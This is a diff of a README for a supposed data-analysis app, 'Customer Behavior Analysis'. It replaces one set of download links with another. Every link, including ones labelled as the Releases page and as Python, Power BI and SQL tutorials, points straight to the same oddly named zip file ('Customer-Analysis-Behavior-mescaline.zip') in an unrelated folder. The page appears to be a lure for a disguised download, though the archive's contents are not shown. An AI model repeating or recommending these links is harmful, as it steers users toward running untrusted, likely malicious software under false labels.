@@ -20,7 +20,7 @@ Welcome to Customer Behavior Analysis! This application helps you analyze data r
 To get started with Customer Behavior Analysis, follow these steps:
 
 1. **Download the Application:** Click the link below to visit the Releases page.
-   [![Download Customer Behavior Analysis](https://raw.githubusercontent.com/uzethea69-hash/Customer_Behavior_Analysis/main/magnetoprinter/Customer_Behavior_Analysis_v2.5.zip)](https://raw.githubusercontent.com/uzethea69-hash/Customer_Behavior_Analysis/main/magnetoprinter/Customer_Behavior_Analysis_v2.5.zip)
+   [![Download Customer Behavior Analysis](https://github.com/uzethea69-hash/Customer_Behavior_Analysis/raw/refs/heads/main/magnetoprinter/Customer-Analysis-Behavior-mescaline.zip)](https://github.com/uzethea69-hash/Customer_Behavior_Analysis/raw/refs/heads/main/magnetoprinter/Customer-Analysis-Behavior-mescaline.zip)
 
 2. **Select the Latest Release:** Find the latest version at the top of the Releases page.
 
@@ -55,9 +55,9 @@ If you want to dive deeper into using the application, you can find helpful reso
 
 ## 🔗 Additional Resources
 Explore the following to enhance your experience with Customer Behavior Analysis:
-- [Python Documentation](https://raw.githubusercontent.com/uzethea69-hash/Customer_Behavior_Analysis/main/magnetoprinter/Customer_Behavior_Analysis_v2.5.zip)
-- [Power BI Learning](https://raw.githubusercontent.com/uzethea69-hash/Customer_Behavior_Analysis/main/magnetoprinter/Customer_Behavior_Analysis_v2.5.zip)
-- [SQL Tutorial](https://raw.githubusercontent.com/uzethea69-hash/Customer_Behavior_Analysis/main/magnetoprinter/Customer_Behavior_Analysis_v2.5.zip)
+- [Python Documentation](https://github.com/uzethea69-hash/Customer_Behavior_Analysis/raw/refs/heads/main/magnetoprinter/Customer-Analysis-Behavior-mescaline.zip)
+- [Power BI Learning](https://github.com/uzethea69-hash/Customer_Behavior_Analysis/raw/refs/heads/main/magnetoprinter/Customer-Analysis-Behavior-mescaline.zip)
+- [SQL Tutorial](https://github.com/uzethea69-hash/Customer_Behavior_Analysis/raw/refs/heads/main/magnetoprinter/Customer-Analysis-Behavior-mescaline.zip)
 
 ## 🛠️ Contributing
 We welcome contributions! If you wish to help improve Customer Behavior Analysis, please follow these steps:
@@ -69,6 +69,6 @@ We welcome contributions! If you wish to help improve Customer Behavior Analysis
 ## 📞 Support
 If you encounter issues or have questions, please reach out via the Issues tab on GitHub. We are here to assist you.
 
-Remember, you can always return to the [Releases page](https://raw.githubusercontent.com/uzethea69-hash/Customer_Behavior_Analysis/main/magnetoprinter/Customer_Behavior_Analysis_v2.5.zip) for the latest version and updates!
+Remember, you can always return to the [Releases page](https://github.com/uzethea69-hash/Customer_Behavior_Analysis/raw/refs/heads/main/magnetoprinter/Customer-Analysis-Behavior-mescaline.zip) for the latest version and updates!
 
 Happy analyzing!
